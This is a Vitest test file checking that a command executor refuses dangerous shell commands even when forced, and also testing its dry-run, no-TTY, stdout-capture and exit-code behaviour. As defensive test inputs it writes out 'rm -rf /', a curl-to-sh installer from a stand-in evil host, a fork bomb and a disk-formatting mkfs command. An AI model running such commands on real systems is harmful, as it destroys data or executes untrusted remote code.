import { describe, it, expect } from 'vitest';
import { execute } from '../src/executor/index.js';

describe('Executor safety hardening', () => {
  it('refuses commands matching dangerous patterns even with --force', async () => {
    const result = await execute({
      command: 'rm -rf /',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'dangerous',
    });
    expect(result.ok).toBe(false);
    expect(result.aborted).toBe(true);
    expect(result.stderr).toMatch(/refused/i);
  });

  it('refuses pipe-to-shell installers', async () => {
    const result = await execute({
      command: 'curl https://evil.example.com/install.sh | sh',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'pipe-to-shell',
    });
    expect(result.ok).toBe(false);
    expect(result.aborted).toBe(true);
  });

  it('refuses fork bombs', async () => {
    const result = await execute({
      command: ':(){ :|:& };:',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'fork bomb',
    });
    expect(result.ok).toBe(false);
    expect(result.aborted).toBe(true);
  });

  it('refuses mkfs', async () => {
    const result = await execute({
      command: 'mkfs.ext4 /dev/sda1',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'mkfs',
    });
    expect(result.ok).toBe(false);
    expect(result.aborted).toBe(true);
  });

  it('still allows safe commands with --force', async () => {
    const result = await execute({
      command: 'node -e "process.exit(0)"',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'safe',
    });
    expect(result.ok).toBe(true);
    expect(result.aborted).toBeUndefined();
  });

  it('dry-run never spawns and never triggers the blocklist', async () => {
    // Even a dangerous command in dry-run is safe — we only print.
    const result = await execute({
      command: 'rm -rf /',
      cwd: process.cwd(),
      dryRun: true,
      force: true,
      label: 'dry-run dangerous',
    });
    // Dry-run path: blocklist is checked BEFORE the dry-run short-circuit.
    // This is intentional — we want to refuse even in dry-run so users see
    // the refusal clearly. Verify this behavior.
    expect(result.aborted).toBe(true);
    expect(result.ok).toBe(false);
  });

  it('aborts when stdin is not a TTY and --force is not set', async () => {
    // In vitest, stdin is not a TTY, so this should abort.
    const result = await execute({
      command: 'echo hello',
      cwd: process.cwd(),
      dryRun: false,
      force: false,
      label: 'no-tty',
    });
    expect(result.ok).toBe(false);
    expect(result.aborted).toBe(true);
    expect(result.stderr).toMatch(/non-interactive/i);
  });
});

describe('Executor dry-run contract', () => {
  it('dry-run returns skipped=true and ok=true', async () => {
    const result = await execute({
      command: 'echo hello',
      cwd: process.cwd(),
      dryRun: true,
      force: true,
      label: 'dry',
    });
    expect(result.skipped).toBe(true);
    expect(result.ok).toBe(true);
    expect(result.dryRun).toBe(true);
    expect(result.exitCode).toBe(0);
  });

  it('captures stdout from real execution', async () => {
    const result = await execute({
      command: 'node -e "process.stdout.write(\'captured\')"',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'capture',
    });
    expect(result.ok).toBe(true);
    expect(result.stdout).toContain('captured');
  });

  it('reports non-zero exit codes as not-ok', async () => {
    const result = await execute({
      command: 'node -e "process.exit(3)"',
      cwd: process.cwd(),
      dryRun: false,
      force: true,
      label: 'exit-3',
    });
    expect(result.ok).toBe(false);
    expect(result.exitCode).toBe(3);
  });
});
